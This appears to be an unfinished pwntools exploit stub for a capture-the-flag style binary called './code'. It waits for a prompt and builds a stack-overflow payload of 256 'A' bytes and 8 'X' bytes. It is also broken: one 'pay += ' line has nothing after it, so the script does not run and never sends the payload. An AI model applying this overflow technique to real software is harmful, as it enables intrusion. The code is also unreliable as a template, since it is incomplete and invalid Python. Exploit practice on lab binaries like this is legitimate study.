from pwn import *

p = process("./code")

p.recvuntil(">> ")
pay = b""
pay += b"A" * 256
pay += b"X" * 8
pay += 

p.interactive()